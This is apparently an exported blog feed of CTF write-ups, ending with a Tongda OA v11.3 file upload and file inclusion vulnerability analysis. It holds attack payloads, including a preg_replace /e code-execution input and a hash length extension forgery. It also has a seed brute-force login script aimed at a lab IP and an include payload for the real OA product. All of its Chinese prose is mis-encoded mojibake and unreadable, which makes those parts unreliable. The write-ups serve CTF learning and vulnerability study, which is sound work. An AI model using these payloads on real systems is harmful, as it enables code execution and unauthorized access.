<li><h3 id="ç®€å•çš„PEé€†å‘"><a href="#ç®€å•çš„PEé€†å‘" class="headerlink" title="ç®€å•çš„PEé€†å‘"></a>ç®€å•çš„PEé€†å‘</h3><p>æŸ¥çœ‹å­—ç¬¦ä¸²å‘ç°å¼‚å¸¸ï¼Œè·³è½¬æŸ¥çœ‹ä»£ç ã€‚</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170705/021302538.png" alt="mark"></p>
</li>
</ul>
<pre><code> memset(&amp;v1, 0xCCu, 0x194u);
  v33 = (unsigned int)&amp;savedregs ^ dword_417000;
  v26 = 0;
  v4 = 1;
  v5 = 4;
  v6 = 14;
  v7 = 10;
  v8 = 5;
  v9 = 36;
  v10 = 23;
  v11 = 42;
  v12 = 13;
  v13 = 19;
  v14 = 28;
  v15 = 13;
  v16 = 27;
  v17 = 39;
  v18 = 48;
  v19 = 41;
  v20 = 42;
  v21 = 26;
  v22 = 20;
  v23 = 59;
  v24 = 4;
  v25 = 0;
  printf(&quot;please enter flag:&quot;);
  sub_411136();
  while ( 1 )
  &#123;
    getch();
    v1 = sub_411136();
    v27[v26] = v1;
    if ( !(_BYTE)v1 || v27[v26] == 13 )
      break;
    if ( v27[v26] == 8 )
    &#123;
      printf(&quot;\b\b&quot;);
      sub_411136();
      --v26;
    &#125;
    else
    &#123;
      printf(&quot;%c&quot;, v27[v26]);
      sub_411136();
      ++v26;
    &#125;
  &#125;
  v3 = 0;
  for ( i = 0; i &lt; 17; ++i )
  &#123;
    if ( v27[i] != byte_415768[*(&amp;v4 + i)] )
      v3 = 1;
  &#125;
  if ( v28 != 49 || v29 != 48 || v30 != 50 || v31 != 52 || v32 != 125 )
    v3 = 1;
  v27[v26] = 0;
  printf(&quot;\r\n&quot;);
  sub_411136();
  if ( v3 )
  &#123;
    printf(&quot;wrong\n&quot;);
    sub_411136();
    sub_41113B();
  &#125;
  else
  &#123;
    printf(&quot;success\n&quot;);
    sub_411136();
  &#125;
  system(&quot;pause&quot;);
  sub_411136();
  sub_411082(&amp;savedregs, &amp;dword_411678);
  sub_411014(v1);
  return sub_411136();
&#125;</code></pre>
<blockquote>
<p>è¯­å¥<code>byte_415768[(&amp;v4 + i)]</code>ä¸­&amp;v4è¡¨ç¤ºå–å˜é‡v4çš„åœ°å€ï¼Œiä»0å˜åˆ°17ï¼Œé‚£ä¹ˆbyte_41576[]ä¸­çš„åºå·ä¾æ¬¡ä¸ºv4,v5,v6,â€¦.v21ï¼Œå…±17ä¸ªå˜é‡çš„å€¼ï¼Œå³v4 = 1ï¼Œv5 = 4ï¼Œv6 = 14ï¼Œv7 = 10ï¼Œv8 = 5ï¼Œv9 = 36ï¼Œv10 = 23ï¼Œv11 = 42ï¼Œ v12 = 13ï¼Œv13 = 19ï¼Œv14 = 28ï¼Œv15 = 13ï¼Œv16 = 27ï¼Œv17 = 39ï¼Œv18 = 48ï¼Œv19 = 41ï¼Œv20 = 42ï¼Œv21 = 26è¿™äº›ã€‚ </p>
</blockquote>
<pre><code>v=&#39;&#39;
s=&#39;KfxEeft&#125;f&#123;gyrYgthtyhifsjei53UUrrr_t2cdsef66246087138\0087138&#39;
a=(1,4,14,10,5,36,23,42,13,19,28,13,27,39,48,41,42)
for i in range(0,17):
    v=v+s[a[i]-1:a[i]]
print v</code></pre>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>ç¬¬åä¸€å‘¨å°ç»„WriteUp</title>
    <url>/2017/05/21/di-shi-yi-zhou-xiao-zu-writeup/</url>
    <content><![CDATA[<h1 id="ç¬¬åä¸€å‘¨å°ç»„WriteUp"><a href="#ç¬¬åä¸€å‘¨å°ç»„WriteUp" class="headerlink" title="ç¬¬åä¸€å‘¨å°ç»„WriteUp"></a>ç¬¬åä¸€å‘¨å°ç»„WriteUp</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="1-Pregï¼ˆ200ï¼‰"><a href="#1-Pregï¼ˆ200ï¼‰" class="headerlink" title="1.Pregï¼ˆ200ï¼‰"></a>1.Pregï¼ˆ200ï¼‰</h3><pre><code>&lt;?php 
error_reporting(0); 
require_once(&quot;flag.php&quot;); 
if(!$passwd) 
&#123; 
  $passwd=$_POST[&quot;passwd&quot;]; 
&#125; 
if(!$lockedtxt) 
&#123; 
  $lockedtxt=$_POST[&quot;lockedtxt&quot;]; 
&#125; 
function flag($var) 
&#123; 
  echo $var; 
&#125; 
if($key) 
&#123; 
  $unlockedtxt=preg_replace($passwd,$key,$lockedtxt); 
&#125; 
if($unlockedtxt===$flag) 
&#123; 
  flag(&quot;The Correct: &quot;); 
  flag($flag); 
&#125; 

show_source(&quot;index.php&quot;); 
// key=flag(\\1) 
 ?&gt; </code></pre>
<p>â€‹    preg_replace()å‡½æ•°çš„æ¼æ´å¯¼è‡´ä»£ç æ‰§è¡Œã€‚</p>
<blockquote>
<p>å‰æï¼š</p>
<p>01ï¼šç¬¬ä¸€ä¸ªå‚æ•°éœ€è¦eæ ‡è¯†ç¬¦ï¼Œæœ‰äº†å®ƒå¯ä»¥æ‰§è¡Œç¬¬äºŒä¸ªå‚æ•°çš„å‘½ä»¤</p>
<p>02ï¼šç¬¬ä¸€ä¸ªå‚æ•°éœ€è¦åœ¨ç¬¬ä¸‰ä¸ªå‚æ•°ä¸­çš„ä¸­æœ‰åŒ¹é…ï¼Œä¸ç„¶echoä¼šè¿”å›ç¬¬ä¸‰ä¸ªå‚æ•°è€Œä¸æ‰§è¡Œå‘½ä»¤</p>
</blockquote>
<p>â€‹    è¿™ä¸ªé¢˜ç¬¬äºŒä¸ªå‚æ•°ä¸æ˜¯å¯ä»¥ä¼ çš„ï¼Œæ˜¯é¢„å…ˆè®¾å®šå¥½çš„ï¼Œä½†æ˜¯<code>\\1</code>ä¸ºç¬¬ä¸€å‚æ•°é‡Œæ­£åˆ™è¡¨è¾¾è¯•åŒ¹é…åçš„å€¼,è¿˜æ˜¯æ‰§è¡Œäº†ç¬¬å››ä¸ªå‚æ•°çš„è¯­å¥ã€‚</p>
<blockquote>
<p>paloadï¼š</p>
<p>passwd=/1(.*?)1/e&amp;lockedtxt=1$flag1</p>
<p>passwd=/(.*)/e&amp;lockedtxt=$flagéƒ½è¡Œï¼Œä¸å”¯ä¸€</p>
</blockquote>
<p>å‚è€ƒï¼š</p>
<blockquote>
<p><a href="http://www.php.net/manual/zh/function.preg-replace.php">http://www.php.net/manual/zh/function.preg-replace.php</a></p>
<p><a href="http://www.2cto.com/article/201212/178024.html">http://www.2cto.com/article/201212/178024.html</a></p>
<p><a href="http://simeon.blog.51cto.com/18680/9895/">http://simeon.blog.51cto.com/18680/9895/</a></p>
<p><a href="https://www.waitalone.cn/phpmyadmin-preg_replace-rce.html">https://www.waitalone.cn/phpmyadmin-preg_replace-rce.html</a></p>
</blockquote>
<h3 id="2-Hashï¼ˆ200ï¼‰"><a href="#2-Hashï¼ˆ200ï¼‰" class="headerlink" title="2.Hashï¼ˆ200ï¼‰"></a>2.Hashï¼ˆ200ï¼‰</h3><pre><code>
&lt;h1&gt;hello ctfer!&lt;h1&gt;&lt;!--&lt;?php
error_reporting(0);
$flag = &quot;xxxxxxxx&quot;;
$secret = &quot;xxxxxxxxxxxxxxxxxxxxxxxxx&quot;; // This secret is 15 characters long for security!

$username = $_POST[&quot;username&quot;];
$password = $_POST[&quot;password&quot;];

if (!empty($_COOKIE[&quot;getmein&quot;])) &#123;
    if (urldecode($username) === &quot;admin&quot; &amp;&amp; urldecode($password) != &quot;admin&quot;) &#123;
        if ($_COOKIE[&quot;getmein&quot;] == md5($secret . urldecode($username . $password))) &#123;
            echo &quot;Congratulations! You are a registered user.\n&quot;;
            die (&quot;The flag is &quot;. $flag);
        &#125;
        else &#123;
            die (&quot;Your cookies don&#39;t match up! STOP HACKING THIS SITE.&quot;);
        &#125;
    &#125;
    else &#123;
        die (&quot;You are not an admin! LEAVE.&quot;);
    &#125;
&#125;

setcookie(&quot;sample-hash&quot;, md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;)), time() + (60 * 60 * 24 * 7));

echo &quot;&lt;h1&gt;hello ctfer!&lt;h1&gt;&quot;;
--&gt;</code></pre>
<p>å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»ã€‚</p>
<p>ä¸Šå·¥å…·ã€‚</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170506/160421906.png" alt="mark"></p>
<p>Input Si gnature:å¡«åä¸ºsample-hashçš„cookieçš„å€¼ï¼Œé¢˜ç›®å·²ç»™å‡ºã€‚</p>
<p>Input Data:å¡«admin</p>
<blockquote>
<p>$secretæ˜¯å¯†æ–‡ï¼Œé•¿åº¦ä¸º15ï¼Œå¦‚æœå†ç®—ä¸Šåé¢ç¬¬ä¸€ä¸ªadminï¼Œé•¿åº¦å°±æ˜¯20<br>è€Œæ•°æ®æ˜¯admin<br>ç­¾åï¼ˆå“ˆå¸Œå€¼ï¼‰æ˜¯be7413992c7e8541aa530688ddbbcc00</p>
</blockquote>
<p>Input Data to Add:éšæ„</p>
<p>ç”Ÿæˆäº†ï¼š</p>
<pre><code>b1700910c22d838ea2615091520a13f3
admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc8\x00\x00\x00\x00\x00\x00\x00qwe</code></pre>
<p>ç¬¬ä¸€è¡Œæ˜¯æ–°çš„å“ˆå¸Œå€¼ï¼Œå°†å…¶è®¾ç½®ä¸ºæ–°cookie(getmein)çš„å€¼ï¼Œç¬¬äºŒè¡Œçš„æ•°æ®å°†<code>\x</code>æ¢æˆ%åœ¨postæäº¤ã€‚</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170506/161315507.png" alt="mark"></p>
<p>èµ„æ–™ï¼š</p>
<blockquote>
<p><a href="http://www.cnblogs.com/pcat/p/5478509.html">http://www.cnblogs.com/pcat/p/5478509.html</a></p>
<p><a href="https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks">https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks</a></p>
<p><a href="https://github.com/bwall/HashPump(%E6%89%80%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7HashPump)">https://github.com/bwall/HashPump(æ‰€ç”¨çš„å·¥å…·HashPump)</a></p>
</blockquote>
<h3 id="3-Codingï¼ˆ300ï¼‰"><a href="#3-Codingï¼ˆ300ï¼‰" class="headerlink" title="3.Codingï¼ˆ300ï¼‰"></a>3.Codingï¼ˆ300ï¼‰</h3><p>.gitæ³„éœ²</p>
<p><strong>å½“å‰å¤§é‡å¼€å‘äººå‘˜ä½¿ç”¨gitè¿›è¡Œç‰ˆæœ¬æ§åˆ¶ï¼Œå¯¹ç«™ç‚¹è‡ªåŠ¨éƒ¨ç½²ã€‚å¦‚æœé…ç½®ä¸å½“ï¼Œå¯èƒ½ä¼šå°†.gitæ–‡ä»¶å¤¹ç›´æ¥éƒ¨ç½²åˆ°çº¿ä¸Šç¯å¢ƒã€‚è¿™å°±å¼•èµ·äº†gitæ³„éœ²æ¼æ´ã€‚</strong></p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170506/173934854.png" alt="mark"></p>
<p>å…³é”®ä»£ç </p>
<pre><code>&lt;?php
error_reporting(0);
include &quot;flag.php&quot;;

$admin_user = &quot;pr0_adm1n&quot;;
$admin_pw = clean_hash(&quot;0e408306536730731920197920342119&quot;);

function clean_hash($hash) &#123;
    return preg_replace(&quot;/[^0-9a-f]/&quot;,&quot;&quot;,$hash);
&#125;

function myhash($str) &#123;
    return clean_hash(md5(md5($str) . &quot;SALT&quot;));
&#125;

function create_password($pw_length =  10)
&#123;
$randpwd = &quot;&quot;;
for ($i = 0; $i &lt; $pw_length; $i++)
&#123;
$randpwd .= chr(mt_rand(33, 126));
&#125;
return $randpwd;
&#125;

?&gt;</code></pre>
<p>å†™è„šæœ¬ï¼ˆæ³¨æ„æ—¶é—´ï¼‰</p>
<pre><code>&lt;?php
$user=&quot;pr0_adm1n&quot;;
for($i=0; $i&lt;1000000000; $i++) &#123;
    $str = $i;
    hash = md5(md5($str) . &quot;SALT&quot;);
    echo $hash.&quot;\n&quot;;
    if(preg_match(&quot;/^0e[0-9]+$/&quot;, $hash)) &#123;
        echo $str.&quot; : &quot;.$hash.&quot;\n&quot;;
        break;
&#125;
            //62778807 : 0e774261293712168181959463563504
&#125;
$password=$str;
function create_password($pw_length = 10)
&#123;
$randpwd = &quot;&quot;;
for ($i = 0; $i &lt; $pw_length; $i++)
&#123;
$randpwd .= chr(mt_rand(33, 126));
&#125;
return $randpwd;
&#125;
function send_post($url, $post_data) &#123;
 $postdata = http_build_query($post_data);
    $options = array(
        &#39;http&#39; =&gt; array(
        &#39;method&#39; =&gt; &#39;POST&#39;,
        &#39;header&#39; =&gt; &#39;Content-type:application/x-www-form-urlencoded&#39;,
        &#39;content&#39; =&gt; $postdata,
        &#39;timeout&#39; =&gt; 15 * 60 // è¶…æ—¶æ—¶é—´ï¼ˆå•ä½ :s ï¼‰
)
);
$context = stream_context_create($options);
$result = file_get_contents($url, false, $context).&quot;\n&quot;;
return $result;
&#125;
for($j=time()-20;$j&lt;time()+20;$j++)
&#123;
    mt_srand($j);
    $pwd=create_password();
    echo &quot;pwd &quot;.$pwd.&quot;\n&quot;;
    echo &quot;user &quot; .$user.&quot;\n&quot;;
    echo &quot;password &quot;.$password.&quot;\n&quot;;
    $post_data = array(
        &#39;user&#39; =&gt; $user,
        &#39;password&#39; =&gt; $password,
        &#39;pwd&#39;=&gt;$pwd
);
$content=send_post(&#39;http://192.168.64.133/ctf/baopo/&#39;,$post_data);
if(strpos($content,&#39;SKCTF&#39;)&gt;-1)
&#123;
echo $content;
&#125;
&#125;</code></pre>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h4 id="1-zip-ï¼ˆ100ï¼‰"><a href="#1-zip-ï¼ˆ100ï¼‰" class="headerlink" title="1.zip??ï¼ˆ100ï¼‰"></a>1.zip??ï¼ˆ100ï¼‰</h4><p>zipä¼ªåŠ å¯†ã€‚</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170506/175454876.png" alt="mark"></p>
<h4 id="2-baseçš„næ¬¡æ–¹ï¼ˆ150ï¼‰"><a href="#2-baseçš„næ¬¡æ–¹ï¼ˆ150ï¼‰" class="headerlink" title="2.baseçš„næ¬¡æ–¹ï¼ˆ150ï¼‰"></a>2.baseçš„næ¬¡æ–¹ï¼ˆ150ï¼‰</h4><p>é¢˜ç›®ç»™å‡ºåŠ å¯†ä»£ç ï¼š</p>
<pre><code>a = &quot;flag&#123;&#125;&quot;
for i in range (1,30):
    b = random.randint(1 , 3)
    if b ==1:
        a= base64.b16encode(a)
    elif b==2:
        a= base64.b64encode(a)
    else:
        a= base64.b32encode(a)
s= open(&quot;flagencode.txt&quot;,&quot;w&quot;)
s.write(a)
print &quot;done!!!&quot;</code></pre>
<p>flagencode.txt</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170506/175732558.png" alt="mark"></p>
<p>å†™è„šæœ¬(py2)ï¼š</p>
<pre><code>import base64
b64 = &quot;abcdefghijklmnopqrstuvwxyz&quot;
b32 = &quot;GHIJKLMOPQSTUVWXYZ&quot;
#s=open(&quot;flagencode.txt&quot;,&quot;r&quot;)
flag=open(&quot;flagencode.txt&quot;).read()
for i in range (1,30):
    base=0
    for c in b64:
        if(c in flag):
            base=int(64)
            break
    if (base==64):
        flag=base64.b64decode(flag)
        base=0
        continue
    for c in b32:
        if(c in flag):
            base=int(32)
            break
    if (base==32):
        flag=base64.b32decode(flag)
        base=0
        continue
    flag=base64.b16decode(flag)
print(flag)</code></pre>
<h4 id="3-shark"><a href="#3-shark" class="headerlink" title="3.shark"></a>3.shark</h4><p>ä¸‹è½½ä¸€ä¸ªæµé‡åŒ…ï¼Œsharkæ‰“å¼€ã€‚</p>
<p>è¿½è¸ªHTTPæµçœ‹åˆ°flag.zipçš„getè¯·æ±‚ï¼Œå¯¼å‡ºæ¥æ˜¯åŠ å¯†çš„flag.txt,å¯†ç åœ¨HTTPå¤´ä¸­ï¼Œbase64è§£å¯†å°±æ˜¯å‹ç¼©åŒ…çš„å¯†ç ã€‚</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170506/182311430.png" alt="mark"></p>
<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h4 id="1-å¤šè¯•å‡ æ¬¡ï¼ˆ100ï¼‰"><a href="#1-å¤šè¯•å‡ æ¬¡ï¼ˆ100ï¼‰" class="headerlink" title="1.å¤šè¯•å‡ æ¬¡ï¼ˆ100ï¼‰"></a>1.å¤šè¯•å‡ æ¬¡ï¼ˆ100ï¼‰</h4><p>æ‹–è¿›IDA.</p>
<p>è¿›å­—ç¬¦Sçœ‹çœ‹å‘ç°ï¼ŒSçš„å€¼ä¸ºè®¾å®šå¥½äº†çš„ä¸ºSDUSTï¼Œè¿›gggå‡½æ•°çœ‹ï¼Œæ˜¯æŠŠsçš„æ¯ä¸€ä¸ªå­—ç¬¦å’Œ0x20å¼‚æˆ–èµ‹ç»™s1ï¼Œå’Œaæ¯”è¾ƒï¼Œè¾“å‡ºs1.</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>è§£å†³zipä¼ªåŠ å¯†çš„å¦ä¸€æ–¹æ³•-çˆ†ç ´</title>
    <url>/2017/04/15/jie-jue-zip-wei-jia-mi-de-ling-yi-fang-fa-bao-po/</url>
    <content><![CDATA[<p>hbctfçš„ä¸€ä¸ªé¢˜â€“&gt;<a href="http://hbctf-1252906577.costj.myqcloud.com/misc/flag6.zip">http://hbctf-1252906577.costj.myqcloud.com/misc/flag6.zip</a></p>
<p>å…ˆæ¥writeupï¼š</p>
<p>è§£å‹è½¯ä»¶æ‰“å¼€ï¼Œå¯ä»¥çœ‹åˆ°CRC32å€¼ã€‚</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170415/012239450.png" alt="mark"></p>
<p>å› ä¸ºé¢˜ç›®æç¤ºäº†æ˜¯6ä½æ•°å­—ï¼ŒåŒ¹é…CRC32çˆ†ç ´ã€‚</p>
<pre><code>import binascii
real = 0x9c4d9a5d
for y in range(100000, 999999):
    if real == (binascii.crc32(str(y)) &amp; 0xffffffff):
        print(y)</code></pre>
<blockquote>
<p><a href="http://baike.baidu.com/link?url=4mgWp8jfdKNnX6rP8n-aHHenk1bgeVhyrnNacwU8HBjJav3YoJX9UKMwgl2ridbDF8uyfyxoGSGvQm0Co4FnMq">CRC</a>çš„å…¨ç§°æ˜¯<a href="http://baike.baidu.com/item/%E5%BE%AA%E7%8E%AF%E5%86%97%E4%BD%99%E6%A0%A1%E9%AA%8C">å¾ªç¯å†—ä½™æ ¡éªŒ</a>ã€‚</p>
<p>CRC32:CRCæœ¬èº«æ˜¯â€œå†—ä½™æ ¡éªŒç â€çš„æ„æ€ï¼ŒCRC32åˆ™è¡¨ç¤ºä¼šäº§ç”Ÿä¸€ä¸ª32bitï¼ˆ8ä½åå…­è¿›åˆ¶æ•°ï¼‰çš„æ ¡éªŒå€¼ã€‚</p>
<p>binasciiï¼šäºŒè¿›åˆ¶å’ŒASCIIäº’è½¬ä»¥åŠå…¶ä»–è¿›åˆ¶è½¬æ¢</p>
</blockquote>
<p>â€‹    ç”±äºCRC32äº§ç”Ÿæ ¡éªŒå€¼æ—¶æºæ•°æ®å—çš„æ¯ä¸€ä¸ªbitï¼ˆä½ï¼‰éƒ½å‚ä¸äº†è®¡ç®—ï¼Œæ‰€ä»¥æ•°æ®å—ä¸­å³ä½¿åªæœ‰ä¸€ä½å‘ç”Ÿäº†å˜åŒ–ï¼Œä¹Ÿä¼šå¾—åˆ°ä¸åŒçš„CRC32å€¼.å†åŠ ä¸Šé¢˜ç›®æç¤ºäº†6ä½æ•°å­—ï¼Œè¿™å°±å¤§å¤§ç¼©å°äº†èŒƒå›´ï¼Œä¸åŒçš„æ•°çš„CRC32å€¼æ˜¯ä¸åŒçš„ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡å¾ªç¯åŒ¹é…æ¥çˆ†ç ´å‡ºæ–‡ä»¶å€¼ï¼Œå³flagã€‚</p>
]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>åŠ è§£å¯†</tag>
      </tags>
  </entry>
  <entry>
    <title>é€šè¾¾OAä»»æ„æ–‡ä»¶ä¸Šä¼ &amp;æ–‡ä»¶åŒ…å«</title>
    <url>/2020/03/31/tong-da-oa-ren-yi-wen-jian-shang-chuan-wen-jian-bao-han/</url>
    <content><![CDATA[<h2 id="ç®€è¿°"><a href="#ç®€è¿°" class="headerlink" title="ç®€è¿°"></a>ç®€è¿°</h2><p>æœ€è¿‘çˆ†å‡ºäº†é€šè¾¾OAçš„ä¸¤æšæ¼æ´ï¼Œæ–‡ä»¶ä¸Šä¼ æ¼æ´ä¸ºå…¨ç‰ˆæœ¬é€šæ€ï¼Œæ–‡ä»¶åŒ…å«æ¼æ´åªæœ‰V11.3ç‰ˆæœ¬å­˜åœ¨ã€‚</p>
<p>é€šè¿‡ç»•è¿‡èº«ä»½è®¤è¯, æ”»å‡»è€…å¯ä¸Šä¼ ä»»æ„æ–‡ä»¶ï¼Œé…åˆæ–‡ä»¶åŒ…å«å³å¯å‡ºå‘è¿œç¨‹æ¶æ„ä»£ç æ‰§è¡Œã€‚</p>
<h2 id="å¤ç°ç¯å¢ƒ"><a href="#å¤ç°ç¯å¢ƒ" class="headerlink" title="å¤ç°ç¯å¢ƒ"></a>å¤ç°ç¯å¢ƒ</h2><p><a href="https://pan.baidu.com/s/1U8rCzFLJjv2o_7nJNlGCoA">é€šè¾¾OA V11.3</a>  å¯†ç :ordv</p>
<p>æºç ä½¿ç”¨zend5.4åŠ å¯†ï¼Œä½¿ç”¨SeayDzendè§£å¯†å·¥å…·è§£å¯†ã€‚</p>
<p>ç”±äºæºç æ–‡ä»¶å¤ªå¤šï¼Œå¯ä»¥åªè§£å¯†é€ æˆæ¼æ´çš„å…³é”®æ–‡ä»¶ã€‚</p>
<pre><code>/ispirit/im/upload.php
inc/utility_file.php
ispirit/interface/gateway.php</code></pre>
<p>è¿™é‡Œåˆ†æä¸€ä¸‹å…¨éƒ¨è§£å¯†åçš„æºç ï¼š<a href="https://pan.baidu.com/s/1lKvhUVhEYSyIPIRNKHSy4Q">é“¾æ¥</a>æå–ç ï¼šp9av</p>
<h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><h3 id="1ã€æ–‡ä»¶åŒ…å«"><a href="#1ã€æ–‡ä»¶åŒ…å«" class="headerlink" title="1ã€æ–‡ä»¶åŒ…å«"></a>1ã€æ–‡ä»¶åŒ…å«</h3><p>é—®é¢˜ä»£ç åœ¨<code>gateway.php</code>æ–‡ä»¶ä¸­ï¼Œæœ‰ä¸€å¤„æ–‡ä»¶åŒ…å«ï¼Œæ»¡è¶³æ¡ä»¶å°±ä¼šåŒ…å«urlã€‚</p>
<pre><code class="php">if ($P != &quot;&quot;) &#123;
    if (preg_match(&quot;/[^a-z0-9;]+/i&quot;, $P)) &#123;
        echo _(&quot;éæ³•å‚æ•°&quot;);
        exit();
    &#125;

    session_id($P);
    session_start();
    session_write_close();
    if (($_SESSION[&quot;LOGIN_USER_ID&quot;] == &quot;&quot;) || ($_SESSION[&quot;LOGIN_UID&quot;] == &quot;&quot;)) &#123;
        echo _(&quot;RELOGIN&quot;);
        exit();
    &#125;
&#125;
if ($json) &#123;
    $json = stripcslashes($json);
    $json = (array) json_decode($json);

    foreach ($json as $key =&gt; $val ) &#123;
        ......
        &#125;

        if ($key == &quot;url&quot;) &#123;
            $url = $val;
        &#125;
    &#125;

    if ($url != &quot;&quot;) &#123;
        if (substr($url, 0, 1) == &quot;/&quot;) &#123;
            $url = substr($url, 1);
        &#125;

        if ((strpos($url, &quot;general/&quot;) !== false) || (strpos($url, &quot;ispirit/&quot;) !== false) || (strpos($url, &quot;module/&quot;) !== false)) &#123;
            include_once $url;
        &#125;
    &#125;

    exit();
&#125;</code></pre>
<p>å…ˆæ˜¯å¯¹<code>$P</code>è¿›è¡Œäº†æ˜¯å¦ä¸ºç©ºã€æ­£åˆ™æ ¡éªŒä»¥åŠå½“å‰ç”¨æˆ·æ˜¯å¦ç™»å½•ã€‚</p>
<p><code>$json</code>å‚æ•°æ¥å—ä¸€ä¸ªjsonæ ¼å¼çš„å€¼ï¼Œç„¶åè½¬åŒ–ä¸ºæ•°ç»„ã€‚æ‰€ä»¥åªè¦åœ¨ä¼ å…¥çš„jsonæ•°æ®ä¸­ä½¿urlå‚æ•°ä¸­åŒ…å«<code>ispirit/</code>ã€<code>general/</code>ã€<code>module/</code>å°±å¯ä»¥é€šè¿‡è·¨ç›®å½•è¿›è¡ŒåŒ…å«ã€‚</p>
<p>payloadï¼š<code>payloadï¼šjson=&#123;&quot;url&quot;:&quot;xxx&quot;&#125;</code></p>
<h3 id="2ã€æ–‡ä»¶ä¸Šä¼ "><a href="#2ã€æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="2ã€æ–‡ä»¶ä¸Šä¼ "></a>2ã€æ–‡ä»¶ä¸Šä¼ </h3><p>æ–‡ä»¶ä¸Šä¼ çš„å…¥å£åœ¨<code>/ispirit/im/upload.php</code>ï¼š</p>
<pre><code class="php">set_time_limit(0);
$P = $_POST[&quot;P&quot;];
if (isset($P) || ($P != &quot;&quot;)) &#123;
    ob_start();
    include_once &quot;inc/session.php&quot;;
    session_id($P);
    session_start();
    session_write_close();
&#125;
else &#123;
    include_once &quot;./auth.php&quot;;
&#125;</code></pre>
<p>å…ˆæ£€æŸ¥æœ‰æ²¡æœ‰POSTå‚æ•°Pï¼ŒPå­˜åœ¨è€Œä¸”å†…å®¹ä¸ä¸ºç©ºåˆ™è·å–sessionï¼Œå¦åˆ™è¿›è¡Œèº«ä»½è®¤è¯ã€‚</p>
<p>ç¬¬20è¡Œå¼€å§‹åˆæœ‰ä¸¤ä¸ªPOSTä¼ é€’çš„å‚æ•°ï¼š</p>
<pre><code class="php">$TYPE = $_POST[&quot;TYPE&quot;];
$DEST_UID = $_POST[&quot;DEST_UID&quot;];
$dataBack = array();
if (($DEST_UID != &quot;&quot;) &amp;&amp; !td_verify_ids($ids)) &#123;
    $dataBack = array(&quot;status&quot; =&gt; 0, &quot;content&quot; =&gt; &quot;-ERR &quot; . _(&quot;æ¥æ”¶æ–¹IDæ— æ•ˆ&quot;));
    echo json_encode(data2utf8($dataBack));
    exit();
&#125;

if (strpos($DEST_UID, &quot;,&quot;) !== false) &#123;
&#125;
else &#123;
    $DEST_UID = intval($DEST_UID);
&#125;
if ($DEST_UID == 0) &#123;
    if ($UPLOAD_MODE != 2) &#123;
        $dataBack = array(&quot;status&quot; =&gt; 0, &quot;content&quot; =&gt; &quot;-ERR &quot; . _(&quot;æ¥æ”¶æ–¹IDæ— æ•ˆ&quot;));
        echo json_encode(data2utf8($dataBack));
        exit();
    &#125;
&#125;</code></pre>
<p><code>$TYPE</code>å’Œ<code>$DEST_UID</code>éƒ½æ˜¯é€šè¿‡POSTçš„æ–¹å¼ä¼ é€’è¿›æ¥çš„ï¼Œç„¶åè¦æ±‚<code>$DEST_UID</code>ä¸ä¸ºç©ºï¼ŒåŒæ—¶å¦‚æœ<code>$DEST_UID</code>ä¸º0çš„è¯<code>$UPLOAD_MODE</code>è¦æ˜¯2ã€‚</p>
<p>ç„¶åç»§ç»­è¿›å…¥æ–‡ä»¶ä¸Šä¼ çš„éƒ¨åˆ†ï¼š</p>
<pre><code class="php">$MODULE = &quot;im&quot;;

if (1 &lt;= count($_FILES)) &#123;
    if ($UPLOAD_MODE == &quot;1&quot;) &#123;
        if (strlen(urldecode($_FILES[&quot;ATTACHMENT&quot;][&quot;name&quot;])) != strlen($_FILES[&quot;ATTACHMENT&quot;][&quot;name&quot;])) &#123;
            $_FILES[&quot;ATTACHMENT&quot;][&quot;name&quot;] = urldecode($_FILES[&quot;ATTACHMENT&quot;][&quot;name&quot;]);
        &#125;
    &#125;

    $ATTACHMENTS = upload(&quot;ATTACHMENT&quot;, $MODULE, false);</code></pre>
<p>å¦‚æœæœ‰æ–‡ä»¶ä¸Šä¼ è¿›å…¥uploadå‡½æ•°ï¼Œå¦åˆ™æŠ¥é”™æ— æ–‡ä»¶ä¸Šä¼ ã€‚ä»ä¸Šé¢ä»£ç çŸ¥é“æ–‡ä»¶ä¸Šä¼ çš„å˜é‡åä¸º<code>ATTACHMENT</code>ï¼Œå¦‚æœ<code>$UPLOAD_MODE</code>ä¸º1ï¼Œä¼šå¤„ç†ä¸€ä¸‹nameå‚æ•°çš„ç¼–ç é—®é¢˜ã€‚ç„¶åè·Ÿè¿›uploadå‡½æ•°ï¼Œè¿›å…¥<code>inc/utility_file.php</code>æ–‡ä»¶ï¼Œç¬¬1665è¡Œã€‚</p>
<p>è¯¥å‡½æ•°ç»è¿‡ä¸€ç³»åˆ—å‚æ•°æ£€æŸ¥ï¼Œæ–‡ä»¶æ£€æŸ¥ç­‰æ£€æŸ¥åè¿”å›ä¸€ä¸ªæ•°ç»„<code>ATTACHMENTS</code>ã€‚</p>
